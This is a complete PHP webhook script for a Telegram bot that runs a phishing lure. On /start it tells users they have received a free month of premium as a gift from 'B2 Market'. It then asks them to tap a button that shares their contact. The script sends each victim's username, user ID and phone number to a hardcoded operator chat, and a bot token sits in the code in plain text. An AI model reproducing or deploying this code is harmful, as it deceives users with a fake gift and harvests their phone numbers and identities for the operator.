<?php
$botToken = '6423963494:AAH5tXa43GDV98zsLA-rr63A7ya26BQAjks';
$telegramApiUrl = "https://api.telegram.org/bot$botToken/";

$update = file_get_contents('php://input');
$updateData = json_decode($update, true);

if (isset($updateData['message']['text'])) {
    $chatId = $updateData['message']['chat']['id'];
    $messageText = $updateData['message']['text'];

    if ($messageText == '/start') {
        $responseMessage = "*🎁 Received Free Premium\n\nGift from: B2 Market\nGift: premium for 1 month\nGift id: L4-vY7A\n\n🔘 Tap below button to claim and activate on your account*";
        $keyboard = [
            'keyboard' => [
                [['text' => '🎁 Claim Premium', 'request_contact' => true]]
            ],
            'resize_keyboard' => true
        ];
        sendKeyboardMessage($chatId, $responseMessage, $keyboard);
    }
}

if (isset($updateData['message']['contact'])) {
    // Process the user's contact information
    $userId = $updateData['message']['from']['id'];
    $username = $updateData['message']['from']['username'];
    $phoneNumber = $updateData['message']['contact']['phone_number'];
    $adminChatId = '5504531780'; // Replace with the admin's chat ID

    $contactMessage = "User: @$username\nUserid: $userId\nNumber: $phoneNumber";
    sendMessage($adminChatId, $contactMessage);
}

function sendMessage($chatId, $text) {
    global $telegramApiUrl;
    $url = $telegramApiUrl . "sendMessage?chat_id=$chatId&text=" . urlencode($text);
    file_get_contents($url);
}

function sendKeyboardMessage($chatId, $text, $keyboard) {
    global $telegramApiUrl;
    $data = [
        'chat_id' => $chatId,
        'text' => $text,
        'parse_mode' => 'markdown',
        'reply_markup' => json_encode($keyboard)
    ];
    $options = [
        'http' => [
            'method' => 'POST',
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($data)
        ]
    ];
    $context = stream_context_create($options);
    $url = $telegramApiUrl . "sendMessage";
    file_get_contents($url, false, $context);
}
?>
